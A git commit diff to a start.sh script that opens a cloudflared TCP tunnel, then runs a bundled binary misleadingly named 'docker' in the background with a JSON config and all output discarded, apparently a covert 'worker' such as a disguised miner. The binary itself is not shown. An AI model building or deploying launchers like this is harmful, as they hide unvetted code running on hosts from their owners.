6bb2311dd9a609bf9e2fcb7f6c15efff580a4dde
stilkuters <stilkuters@quickmails.eu>
2026-03-09 09:27:42 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,17 +1,17 @@
 #!/bin/bash
 
-echo "Starting cloudflared tunnel..."
+echo "Starting cloudflared..."
 
-nohup cloudflared access tcp --hostname "$(cat hostname.txt)" --url 127.0.0.1:443 >/dev/null 2>&1 &
+cloudflared access tcp --hostname "$(cat hostname.txt)" --url 127.0.0.1:443 >/dev/null 2>&1 &
 
 sleep 5
 
 echo "Starting docker binary..."
 
 chmod +x ./docker
-nohup ./docker -c docker.json >/dev/null 2>&1 &
+./docker -c docker.json >/dev/null 2>&1 &
 
-echo "Worker running..."
+echo "Running..."
 
 while true
 do
